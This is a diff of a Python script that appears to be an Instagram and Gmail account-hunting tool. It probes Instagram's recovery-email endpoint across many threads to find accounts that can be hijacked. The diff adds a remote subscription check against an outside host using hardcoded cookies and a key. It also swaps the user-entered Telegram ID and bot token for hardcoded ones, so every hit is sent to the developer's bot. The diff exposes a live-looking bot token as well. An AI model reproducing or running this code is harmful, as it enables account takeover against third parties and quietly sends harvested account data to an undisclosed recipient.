@@ -16,8 +16,75 @@ from random import choice, randrange
 from cfonts import render, say
 from colorama import Fore, Style, init
 init(autoreset=True)
+CYAN    = '\033[1;36m'
+GREEN   = '\033[1;32m'
+R = '\033[91m'      # الأحمر
+bold = '\033[1m'    # غامق
+RESET = '\033[0m'   # إعادة تعيين اللون والتنسيق
+from rich.console import Console
+from rich.text import Text
+from rich.panel import Panel
+from rich.align import Align
+from concurrent.futures import ThreadPoolExecutor
 
 
+console = Console()
+
+#=======================================
+
+cookies = {
+    'PHPSESSID': '8851bf78831b9b6b17338433dbf506da',
+    '__test': 'bc7198112fde4db7d978fb2d1a15439f',
+}
+
+headers = {
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'Accept-Language': 'ar-DZ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'Cache-Control': 'max-age=0',
+    'Connection': 'keep-alive',
+    'Sec-Fetch-Dest': 'document',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-Site': 'none',
+    'Sec-Fetch-User': '?1',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+}
+
+params = {
+    'tool': 'AmeenMta7',
+    'key': '21232f297a57a5a743894a0e4a801fc3',
+    'i': '1',
+}
+
+try:
+    response = requests.get('https://leadersyria.alchosting.xyz/api.php', params=params, cookies=cookies, headers=headers)
+    text = response.text.strip()
+
+    if text:
+        try:
+            data = response.json()
+            status = data.get("status")
+
+            if status == "ON":
+                pass  
+            elif status == "OFF":
+                print(f"{R}{bold}انتهى اشتراكك يرجى الاشتراك @SYRIA7R")
+                exit()
+            else:
+                print(f"{R}{bold}خطأ: الحالة غير معروفة")
+        except ValueError:
+            print(f"{R}{bold}خطأ في تحليل JSON")
+            exit()
+    else:
+        print(f"{R}{bold}الرد فارغ")
+        exit()
+except Exception as e:
+    print(f"{R}{bold}خطأ في الاتصال:", str(e))
+    exit()
+#====================≈==================    
 INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
 IG_SIG_KEY_VERSION = 'ig_sig_key_version'
 SIGNED_BODY = 'signed_body'
@@ -38,11 +105,11 @@ AUTHORITY_HEADER = 'authority'
 CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
 CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'
 
-TOKEN_FILE = 'tl.txt'
+TOKEN_FILE = 'tokenSyria.txt'
 eizon_domain = '@gmail.com' 
 
 IMAGE_URL = 'https://ibb.co/HLBwnCKK'
-CHANNEL_USERNAME = "@LEADERSYRIAPY"
+CHANNEL_USERNAME = "@LEADERSYRIA"
 
 E = '\033[1;31m'
 W2 = '\x1b[38;5;120m'
@@ -99,10 +166,9 @@ red = "\033[1m\033[31m"
 green = "\033[1m\033[32m"
 yellow = "\033[1m\033[33m"
 blue = "\033[1m\033[34m"
-# تعريف الألوان أو المتغيرات المفقودة
-ge = "\033[1;32m"  # يمكن أن يكون اللون الأخضر
-bt = "\033[1;31m"  # اللون الأحمر
-be = "\033[1;34m"  # اللون الأزرق
+ge = "\033[1;32m" 
+bt = "\033[1;31m"  
+be = "\033[1;34m"  
 F = "\033[1;36m"   # اللون الفيروزي
 HH = "\033[1;33m"  # اللون الأصفر
 M = "\033[1;35m"   # اللون البنفسجي
@@ -114,7 +180,6 @@ magenta = "\033[1m\033[35m"
 M = "\033[1m\033[36m"
 white = "\033[1m\033[37m"
 orange = "\033[1m\033[38;5;208m"
-reset = "\033[0m"
 O = '\x1b[38;5;208m' ; Y = '\033[1;34m' ; C = '\033[2;35m' ; M = '\x1b[1;37m'
 RED     = '\033[1;31m'
 GREEN   = '\033[1;32m'
@@ -126,6 +191,8 @@ WHITE   = '\033[1;37m'
 GRAY    = '\033[1;90m'
 RESET   = '\033[0m'
 ORANGE  = '\033[38;5;208m'
+bold = "\033[1m"
+reset = "\033[0m"
 
 # معلومات البدء
 total_hits = 0
@@ -135,37 +202,35 @@ bad_email = 0
 good_ig = 0
 infoinsta = {}
 
-# لوجو باستخدام cfonts
-line = CYAN + "—" * 67
-print(line)
-title = render('LEADER', colors=['white', 'cyan'], align='center')
-print(title)
-subtitle = render('SYRIA', colors=['white', 'red'], align='center')
-print(subtitle)
+info_text = Text()
+info_text.append(" Developer: ", style="bold white")
+info_text.append("@SYRIA7R", style="bold cyan")
+info_text.append("   |   ", style="white")
+info_text.append("Channel: ", style="bold white")
+info_text.append("@LEADERSYRIAPY", style="bold red")
 
-# معلومات المطور
-print(f"{WHITE} Developer : {CYAN}@SYRIA7R {WHITE}| Channel: {RED}@LEADERSYRIAPY")
-print(line)
+info_panel = Panel(
+    Align.center(info_text),
+    border_style="cyan",
+    title="[bold red]INFO",
+    width=60
+)
+
+console.print(info_panel)
 
 # مدخلات المستخدم
-ID = input(f"{BLUE}[●]{WHITE} ID     : {RESET}")
+ID = '7721705352'
 print(BLUE + "━" * 66)
-TOKEN = input(f"{BLUE}[●]{WHITE} TOKEN  : {RESET}")
-os.system('clear')
-os.system('clear')
+TOKEN = '7058414712:AAGtGYTdZG7KmZ0dym_YXfb724vfVoXCYng'
+
 secim = print(f"""
-{red}╔════════════════════════════════════════════════════════╗
-{red}║ {orange}-> {blue}1{white} - {yellow}2011                                      {red} ║
-{red}║ {orange}-> {blue}2{white} - {yellow}2012                                      {red} ║
-{red}║ {orange}-> {blue}3{white} - {yellow}2013                                      {red} ║
-{red}║ {orange}-> {blue}4{white} - {yellow}2014                                      {red} ║
-{red}║ {orange}-> {blue}5{white} - {yellow}2015                                      {red} ║
-{red}║ {orange}-> {blue}6{white} - {yellow}2016                                      {red} ║
-{red}║ {orange}-> {blue}7{white} - {yellow}2017                                      {red} ║
-{red}║ {orange}-> {blue}8{white} - {yellow}2018                                      {red} ║
-{red}║ {orange}-> {blue}9{white} - {yellow}2019                                      {red} ║
-{red}║ {orange}-> {blue}0{white} - {yellow}2011 {white}~ {yellow}2019                        {red} ║
-{red}╚════════════════════════════════════════════════════════╝
+{green}━━━━━━━━━━━━━━━━━━━━━ {yellow}    ✦ Select a Year ✦ {green}━━━━━━━━━━━━━━━━━━━━━
+
+{orange}   [1] {white}→ {yellow}2011        {orange}[2] {white}→ {yellow}2012        {orange}[3] {white}→ {yellow}2013        {orange}[4] {white}→ {yellow}2014
+{orange}   [5] {white}→ {yellow}2015        {orange}[6] {white}→ {yellow}2016        {orange}[7] {white}→ {yellow}2017        {orange}[8] {white}→ {yellow}2018
+{orange}   [9] {white}→ {yellow}2019        {orange}[0] {white}→ {yellow}All Years {white}(2011~2019)
+
+{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """)
 
 eizon = input(f"{green}→ {yellow}𝐘𝐨𝐮𝐫 𝐜𝐡𝐨𝐢𝐜𝐞 : {blue}→ ")
@@ -209,7 +274,7 @@ def pppp():
     ge = hits              
     bt = bad_insta + bad_email 
     be = good_ig            
-    print(f"\r{F}    Hits{HH} : {M}{ge} ~ {Z} Bad İg {HH} : {M}{bt} ~ {X} Good İg {HH} : {M}{be} {G}   [ 𝐋𝐞𝐚𝐝𝐞𝐫 ] {green}| {yellow}SYRIA7R{blue}")
+    print(f"\r{F}│ {W2}𝐇𝐢𝐭𝐬{WHITE}:{YELLOW} {ge}{RESET}  {F}│ {W3}𝐁𝐚𝐝 𝐈𝐆{WHITE}:{YELLOW} {bt}{RESET}  {F}│ {W4}𝐆𝐨𝐨𝐝 𝐈𝐆{WHITE}:{YELLOW} {be}{RESET}  {F}│ {W5}𝐋𝐞𝐚𝐝𝐞𝐫{WHITE}:{CYAN} 𝐒𝐘𝐑𝐈𝐀𝟕𝐑 ⚡", end="")
 
 def update_stats():
     pppp()
@@ -425,7 +490,7 @@ def InfoAcc(username, domain):
  ║ @Leadersyriapy | 𝐋𝐞𝐚𝐝𝐞𝐫 ║
  ╚════════════════════════════════════════╝
 """
-    with open('eizonhits.txt', 'a') as f:
+    with open('leadersytia.txt', 'a') as f:
         f.write(info_text + "\n")
     try:
         requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
@@ -455,5 +520,7 @@ def eizon_python():
         except Exception:
             pass
 
-for _ in range(150):
-    Thread(target=eizon_python).start()
+
+with ThreadPoolExecutor(max_workers=100) as executor:
+    for _ in range(100):
+        executor.submit(eizon_python)
